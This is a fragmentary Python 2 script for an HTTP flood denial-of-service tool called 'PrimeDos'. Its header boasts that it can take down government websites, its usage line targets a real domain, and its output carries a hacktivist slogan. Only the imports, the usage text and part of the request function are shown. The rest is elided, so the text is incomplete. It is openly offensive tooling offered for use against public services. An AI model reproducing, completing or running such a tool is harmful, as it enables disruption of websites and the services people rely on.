...
# PrimeDos Tool
#
# The PrimeDos Protocol is the most massive type of attack
# This tool can tangodown gov websites
# 
#
# author : __minuhereee__ , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	...
	print 'Example: Saphyra.py http://www.google.com/'
	print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print "----->>> ! We are The Anon 69 - ExpectUS ! <<<-----"
			code=500
